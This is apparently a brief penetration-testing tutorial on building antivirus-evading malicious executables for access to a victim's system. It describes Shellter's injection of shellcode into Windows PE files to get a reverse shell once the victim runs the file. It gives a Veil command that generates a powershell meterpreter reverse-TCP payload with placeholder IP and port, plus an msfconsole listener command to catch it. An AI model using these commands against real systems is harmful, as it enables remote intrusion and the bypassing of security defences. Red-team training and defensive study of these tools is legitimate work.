A common way to get into the victim's system is to create executables or runnable files that are with the purpose of gaining reverse shells or dumping sensitive informations. It is important to bypass antivirus and file checks. A good way to know if the crafted file is malicious or not, and respectively a good way to check if the executable files we downloaded have hidden malicious instructions is to use [VirusTotal](https://www.virustotal.com/) or other web analyzers. Typically they check for meaningful fingerprint and they compare them to the most common malicious and know fingerprint found. If one ore more fingerprint is recognized, the file will be flagged as dangerous.

## [Shellter](https://github.com/ParrotSec/shellter)

A famous tool to modify a executable files is Shellter. As the GitHub page says, Shellter is a dynamic shellcode injection tool aka dynamic PE infector. It can be used in order to inject shellcode into native Windows applications (currently 32-bit apps only). The shellcode can be something yours or something generated through a framework, such as Metasploit. Providing a PE file (the executable file format for Windows), like some 32 bit installer, Shellter will inject malicious instruction in order to bind with a reverse shell the victim with the attacker machine, once double clicked. It provides also the `stealth mode` that can try to evade antivirus detection with various tecniques.

## [Veil Framework](https://github.com/Veil-Framework/Veil)

Veil is a Framework that generates metasploit payloads that bypass common anti-virus solutions. It can generate a payloads for many scenarios. An example of Veil usage for a simple rev-shell using a batch file `(.bat)` is the following

```shell
veil -t Evasion -p powershell/meterpreter/rev_tcp.py --ip <IP> --port <PORT>
```

This is binded to the follow meterpreter listener

```shell
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <LHOST>;set LPORT <LPORT>;run;"
```